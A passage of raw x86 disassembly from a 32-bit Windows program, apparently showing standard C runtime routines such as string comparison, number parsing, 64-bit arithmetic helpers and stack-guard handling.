  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
